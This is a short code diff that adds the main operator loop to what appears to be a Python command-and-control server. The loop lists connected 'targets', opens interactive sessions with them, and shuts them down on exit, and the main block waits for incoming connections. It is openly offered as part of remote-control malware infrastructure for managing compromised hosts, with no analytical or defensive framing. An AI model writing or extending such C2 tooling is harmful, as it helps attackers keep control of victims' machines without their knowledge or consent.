@@ -115,3 +115,24 @@ def run_c2():
 
     while True:
         try:
+            cmd = input("[C2] > ")
+            if cmd == 'targets':
+                list_targets(ips)
+            elif cmd.startswith('session '):
+                idx = int(cmd.split()[1])
+                target_communication(targets[idx], ips[idx])
+            elif cmd == 'exit':
+                for t in targets:
+                    send_json(t, 'quit')
+                    t.close()
+                sock.close()
+                sys.exit(0)
+            else:
+                print("[ERROR] Unknown command")
+        except Exception as e:
+            print(f"[ERROR] C2 loop exception: {e}")
+
+if __name__ == '__main__':
+    print(banner())
+    print("[+] Waiting for incoming connections...")
+    run_c2()
